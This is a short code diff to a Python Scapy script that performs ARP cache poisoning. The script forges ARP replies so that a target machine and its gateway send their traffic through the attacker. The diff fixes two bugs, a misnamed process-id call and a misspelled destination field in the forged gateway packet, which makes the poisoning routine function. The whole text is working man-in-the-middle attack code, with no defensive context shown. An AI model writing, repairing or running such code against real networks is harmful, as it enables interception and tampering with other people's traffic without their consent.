@@ -15,7 +15,7 @@ def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
     send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
 
     # signal the main thread to exit
-    os.kill(os.get_pid(), signal.SIGINT)
+    os.kill(os.getpid(), signal.SIGINT)
 
 def get_mac(ip_address):
     # send an ARP request and get the MAC address from the response
@@ -36,7 +36,7 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
     poison_gateway = ARP()
     poison_gateway.op = 2
     poison_gateway.psrc = target_ip
-    poison_gateway.psdt = gateway_ip
+    poison_gateway.pdst = gateway_ip
     poison_gateway.hwdst = target_mac
 
     print("[*] Beginning the ARP poison. [CTRL-C to stop]")
